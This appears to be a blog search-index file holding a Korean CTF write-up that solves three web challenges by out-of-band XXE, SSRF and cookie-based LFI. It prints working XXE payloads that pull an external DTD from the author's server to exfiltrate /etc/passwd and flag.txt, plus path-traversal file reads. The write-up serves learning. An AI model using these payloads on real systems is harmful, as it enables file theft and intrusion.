<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>0x41414141 CTF Write Up</title>
      <link href="2021/01/30/2021-01-31-0x414141410CTF/"/>
      <url>2021/01/30/2021-01-31-0x414141410CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/team.png?raw=true"></p><p>2021년 1월 26일 저녁에 <code>Ainsetin</code>님이 씨텝 같이 하자고 하셔서 31일까지 참여를 했었는데 많은 도움이 되지 못 한 거 같아 스스로 반성을 많이 한 대회입니다. 여튼 이번 대회에는 버스를 타서 14등을 했고, 솔브수가 그나마 적은 웹 3 문제의 Write Up을 작성해보겠습니다.<br></p><hr><h2 id="Web-Special-Order-pt2-490-pts"><a href="#Web-Special-Order-pt2-490-pts" class="headerlink" title=" (Web) Special Order pt2 [490 pts]"></a><span style="color:#21C587"></span> (Web) Special Order pt2 [490 pts]</h2><blockquote><p>Special Order pt2 문제는 웹 애플리케이션 취약점을 찾고, OOB XXE를 이용해서 flag를 긁어오는 문제입니다.</p></blockquote><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/Special%20Order%20pt2/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.45.25.png?raw=true"></p><p>문제로 들어오면 login 폼이 보이고, 바로 밑에 회원 가입 링크가 있는 것을 볼 수 있습니다. 그러니 그냥 가입하고, 로그인을 해주면 됩니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/Special%20Order%20pt2/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.46.15.png?raw=true"></p><p>로그인을 하고 들어오면 <code>special Order</code> 블로그가 나오는 것을 볼 수 있고, 위에 보면 <code>HOME</code>, <code>POST</code>, <code>POST SETTING</code>, <code>CREATE POST</code>가 있는 것을 볼 수 있습니다. 취약점은 <code>POST SETTING</code>에서 터집니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/Special%20Order%20pt2/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.46.34.png?raw=true"></p><p><code>POST SETTING</code>로 들어오면 폰트 색상과 폰트 사이즈를 정해서 보낼 수 있습니다. 한 번 요청을 보내 헤더를 잡아보겠습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 33</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;color&quot; : &quot;red&quot;, &quot;size&quot;: &quot;20px&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 11:50:42 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 7</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">DONE :D</span><br></pre></td></tr></table></figure><p>요청 헤더를 보면 색상과 사이즈를 json으로 보내는 것을 볼 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 33</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;color&quot; : &quot;red&quot;, &quot;size&quot;: &quot;20px&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 11:52:00 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 70</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">Start tag expected, &#39;&lt;&#39; not found, line 1, column 1 (&lt;string&gt;, line 1)</span><br></pre></td></tr></table></figure><p>여기서 Content-Type을 <code>application/xml</code>로 바꿔서 보내주면 XML Parsing 에러가 나는 것을 볼 수 있습니다. 이 말은 XML이 작동 중이며 XXE 공격이 가능하다는 소리입니다. 일단 색상과 사이즈의 크기는 응답에 포함되지 않기 때문에 일반적인 XXE 기법을 이용할 순 없습니다. 그래서 <code>Out-of-band XXE</code> 기법을 이용하기로 했고, 해당 기법을 쓸려면 일단 DTD를 로드 할 수 있는 지 확인해야합니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 175</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE pocas [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;141.164.52.207&#x2F;test&quot;&gt;]&gt;</span><br><span class="line">&lt;pocas&gt;</span><br><span class="line">    &lt;color&gt;&amp;xxe;&lt;&#x2F;color&gt;</span><br><span class="line">    &lt;size&gt;40px&lt;&#x2F;size&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Aapache Log</span><br><span class="line">207.180.200.166 - - [31&#x2F;Jan&#x2F;2021:12:14:10 +0000] &quot;GET &#x2F;test HTTP&#x2F;1.0&quot; 404 456 &quot;-&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><p>확인을 해보니 잘 되는 것을 볼 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 170</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.96 Safari&#x2F;537.36</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;141.164.52.207&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 12:04:41 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 1343</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">Invalid URI: http:&#x2F;&#x2F;141.164.52.207&#x2F;root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;ash</span><br><span class="line">bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin</span><br><span class="line">(생략)</span><br><span class="line">guest:x:405:100:guest:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">uwsgi:x:100:101:uwsgi:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin</span><br><span class="line">, line 2, column 77 (evil.dtd, line 2)</span><br></pre></td></tr></table></figure><p>처음 해보는 기법이라 해외 <a href="https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/">블로그</a>를 보며 공부를 하고, 진행했는데 좀 신기했습니다. 여튼 oob xxe를 이용해서 <code>/etc/passwd</code>를 긁어오니 잘 긁어오는 것을 볼 수 있습니다. 이제 FLAG가 들어있는 파일만 읽으면 되는데 파일을 모르니 한 번 찾아보겠습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 168</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;141.164.52.207&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 12:17:57 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 102</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">Invalid URI: http:&#x2F;&#x2F;141.164.52.207&#x2F;flag&#123;i7_1s_n0t_s0_bl1nd3721&#125;</span><br><span class="line">, line 2, column 77 (evil.dtd, line 2)</span><br></pre></td></tr></table></figure><p>그래서 <code>flag</code>, <code>flag.php</code>, <code>flag.txt</code>를 하나 하나 다 확인 해보니 <code>flag.txt</code>가 존재했고, FLAG가 읽히는 것을 볼 수 있었습니다.<br></p><blockquote><p>FLAG : flag{i7_1s_n0t_s0_bl1nd3721}</p></blockquote><hr><h2 id="Web-firstapp-496-pts"><a href="#Web-firstapp-496-pts" class="headerlink" title=" (Web) firstapp [496 pts]"></a><span style="color:#21C587"></span> (Web) firstapp [496 pts]</h2><blockquote><p>firstapp 문제는 SSRF 취약점을 이용해서 내부 서버에 있는 파일을 릭하는 문제입니다.<br></p></blockquote><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/firstapp/1.png?raw=true"></p><p>일단 문제로 들어오면 login이 되지 않았다고 뜨는 것을 볼 수 있습니다. 여기서 <code>/login</code>이 존재할 거 같다는 생각을 할 수 있고, <code>/login</code>으로 가서 아무 아이디/비밀번호로 로그인을 하면 로그인이 됩니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/firstapp/2.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;profile?id&#x3D;&lt;name&gt;</span><br></pre></td></tr></table></figure><p>로그인을 하고 들어오면 위와 같이 3개의 프로필이 있는 것을 볼 수 있습니다. 프로필은 위와 같이 <code>/profile</code>에서 <code>id</code> 파라미터로 참조하게 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;profile?id&#x3D;flag</span><br></pre></td></tr></table></figure><p>그래서 <code>id</code>의 값으로 flag를 주니 <code>flag.png</code> 파일이 하나 나오는데 처음에는 이 사진을 HxD로 열어서 확인하면 FLAG가 있을 줄 알았는데 존재하지 않았습니다. 그래서 일단 여기까지 하고 답이 없어서 Dirb를 이용해서 디렉터리 브루트 포싱을 진행했습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# dirb http:&#x2F;&#x2F;45.134.3.200:3000&#x2F; ~&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Jan 31 08:17:05 2021</span><br><span class="line">URL_BASE: http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;</span><br><span class="line">WORDLIST_FILES: &#x2F;root&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http:&#x2F;&#x2F;45.134.3.200:3000&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;css (CODE:301|SIZE:173)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;get_file (CODE:200|SIZE:18)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;images (CODE:301|SIZE:179)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;login (CODE:200|SIZE:5661)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;Login (CODE:200|SIZE:5661)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;logout (CODE:302|SIZE:28)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;profile (CODE:200|SIZE:24)</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Jan 31 08:33:29 2021</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 7</span><br><span class="line">root@py:~#</span><br></pre></td></tr></table></figure><p>dirb 툴을 돌려보니 <code>/get_file</code>이 존재하는 것을 알 수 있었고, 혹시나 <code>/get_url</code>도 있나 해보니 <code>/get_url</code>도 있었습니다. 이로서 우리는 2개의 벡터를 더 찾았습니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/firstapp/3.png?raw=true"></p><p>제일 먼저 <code>/get_file</code>에서 시도해보았습니다. 일단 파라미터를 알지 못 하지만 file이라는 파라미타를 사용하고 있을 거 같다는 생각을 할 수 있습니다. 그래서 file 파라미터로 flag, flag.txt, flag.py, flag.php 등 등을 읽어 보려 했지만 어떤 값이 들어와도 <code>SRSLY ???</code>라는 문자열만 출력이 되었습니다.<br></p><p>하지만 아까 게싱을 해서 <code>/get_url</code>이 존재한다는 것을 알아냈습니다. 그래서 SSRF를 이용해서 FLAG가 들어있는 파일을 긁어 오기로 했습니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/firstapp/4.png?raw=true"></p><p><code>/get_url</code>에서 일단 url이라는 파라미터로 SSRF를 시도해보니 <code>not logged in</code>이 뜨는 것을 볼 수 있습니다. 분명 로그인을 했는 데, <code>not logged in</code>이 뜨는 이유는 내부 서버로 잘 접근을 했다는 것 입니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/firstapp/5.png?raw=true"></p><p>그래서 SSRF를 이용해서 flag.* 파일을 모두 읽어 보니 flag.txt 파일이 존재하는 것을 알 수 있었고, 해당 파일 내용으로 FLAG가 있는 것을 볼 수 있습니다.<br></p><blockquote><p>FLAG : flag{h0p3_y0u_l1ked_my_@pp5613}</p></blockquote><hr><h2 id="Web-waffed-496-pts"><a href="#Web-waffed-496-pts" class="headerlink" title=" (Web) waffed [496 pts]"></a><span style="color:#21C587"></span> (Web) waffed [496 pts]</h2><blockquote><p>waffed 문제는 Cookie 변조와 LFI 취약점을 이용해서 flag를 가져오는 문제입니다.</p></blockquote><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/waffed/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2010.18.53.png?raw=true"></p><p>문제로 들어오면 <code>waffed</code> 사이트가 뜨는 것을 볼 수 있습니다. 해당 사이트는 각 코인마다 퍼센트지를 보여지는 사이트입니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/waffed/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2010.19.08.png?raw=true"></p><p><code>LEARN MORE</code> 버튼을 눌러보면 현재 선택한 코인의 퍼센트지를 그래프를 보여주고 있는 것을 볼 수 있고, 현재 코인 이름은 <code>price_feed</code> 쿠키에 저장이 되어 있습니다. 그리고 다른 코인의 그래프를 볼 수 있게 설정하는 기능도 있습니다. 그럼 한 번 다른 코인으로 바꾸는 요청을 잡고, 헤더를 확인해보겠습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">GET &#x2F;changeFeed&#x2F;DAI HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:9090</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 302 FOUND</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 13:19:56 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 219</span><br><span class="line">Location: http:&#x2F;&#x2F;207.180.200.166:9090&#x2F;trade</span><br><span class="line">Connection: close</span><br><span class="line">Set-Cookie: price_feed&#x3D;REFJ; Path&#x3D;&#x2F;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 3.2 Final&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;title&gt;Redirecting...&lt;&#x2F;title&gt;</span><br><span class="line">&lt;h1&gt;Redirecting...&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;You should be redirected automatically to target URL: &lt;a href&#x3D;&quot;&#x2F;trade&quot;&gt;&#x2F;trade&lt;&#x2F;a&gt;.  If not click the link.</span><br></pre></td></tr></table></figure><p>헤더를 보면 요청을 하면 <code>DAI</code>라는 코인으로 바꾸고, 바로 그래프가 있는 곳으로 리다이렉션 시켜주는 것을 볼 수 있습니다. 여기서 중요한 부분은 응답에 <code>Set-Cookie</code> 헤더를 보면 <code>price_feed</code>의 값으로 <code>REFJ</code>가 들어있는 것을 볼 수 있습니다. <code>REFJ</code>는 우리가 바꾼 코인의 이름(DAI)이 b64로 인코딩되어 들어간 것 입니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/waffed/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2010.20.31.png?raw=true"></p><p>즉, 서버에서는 b64로 해당 쿠키 값을 디코딩해서 사용한다는 것 입니다. 그래서 일단 SQL Injection을 시도해보기 위해서 페이로드를 b64 인코딩을 해줘서 보내주니 <code>WOOPS</code>만 뜨고 아무 일도 일어나지 않았습니다.<br></p><p>하지만 여기서 <code>price_feed</code> 값으로 코인 이름을 바꿔서 코인에 대한 파일을 조회하는 거라면?이라고 생각을 했습니다. 그 이유는 코인마다 그래프도 다 다르기 때문에 모든 데이터를 각 코인의 파일로 관리하고 있을 거라는 생각이 들었습니다. 그래서 바로 LFI를 진행했고, 일단 <code>/etc/passwd</code>를 긁어오기를 시도했습니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/waffed/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2010.20.31.png?raw=true"></p><p>그래서 <code>/etc/passwd</code>를 b64로 인코딩해서 쿠키 값으로 설정하고, 새로 고침을 해주니 SQL Injection과 마찬가지로 <code>WOOPS</code>라고 뜨는 것을 볼 수 있습니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/waffed/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2010.21.54.png?raw=true"></p><p>하지만 현재 경로에서 해당 파일이 없어 <code>WOOPS</code>가 출력되는 걸 수도 있기 때문에 상위로 한 번 한 번 올라가며 모두 시도 해보았는데, 총 4번 올라가서 <code>../../../../etc/passwd</code>를 읽어보니 <code>WOOPS</code>가 뜨지 않고, 그래프가 있는 창으로 리다이렉션이 되었습니다. 그런데 이상한 점은 그래프는 있는데 그래프에 데이터가 존재하지 않았습니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/waffed/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2010.22.06.png?raw=true"></p><p>그래서 그래프의 소스 코드를 확인해보니 그래프를 만드는 JS 코드가 있었고, 그래프의 data 값으로 <code>/etc/passwd</code>의 값이 들어가 있는 것을 볼 수 있었습니다. 예상대로 각 코인의 데이터를 파일로 관리하고 있었습니다.</p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/waffed/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2010.23.01.png?raw=true"></p><p>앞에 모든 문제도 FLAG는 <code>flag.txt</code>에 있었기 때문에 이번 문제도 상위로 4번 올라가 <code>../../../../flag.txt</code>를 읽어주니 그래프의 data에 FLAG가 있는 것을 볼 수 있었습니다.<br></p><blockquote><p>flag{w@fs_r3@lly_d0_Suck8245}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> XXE </tag>
            
            <tag> LFI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dreamhack CTF Season 1 Round #4 Write Up</title>
      <link href="2021/01/30/2021-01-30-dctf/"/>
      <url>2021/01/30/2021-01-30-dctf/</url>
      
